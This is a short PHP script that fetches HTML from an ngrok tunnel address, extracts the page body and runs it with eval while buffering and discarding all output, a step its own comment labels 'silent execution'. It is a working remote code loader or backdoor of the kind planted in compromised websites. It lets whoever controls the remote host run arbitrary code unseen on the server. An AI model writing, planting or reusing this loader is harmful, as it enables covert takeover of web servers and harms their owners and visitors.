<?php
$url = 'https://desired-gazelle-steadily.ngrok-free.app/body';

$html = file_get_contents($url);
if ($html === false) {
    die('Failed to retrieve body');
}

/* ---- extract <body> ---- */
libxml_use_internal_errors(true);
$dom = new DOMDocument();
$dom->loadHTML($html, LIBXML_NOERROR | LIBXML_NOWARNING);
$bodyNode = $dom->getElementsByTagName('body')->item(0);

if (!$bodyNode) {
    die('No <body> found');
}

$body = '';
foreach ($bodyNode->childNodes as $child) {
    $body .= $dom->saveHTML($child);
}
libxml_clear_errors();

/* ---- SILENT EXECUTION ---- */
ob_start();           // start buffering
eval("?>".$body);     // execute body
ob_end_clean();       // discard all output
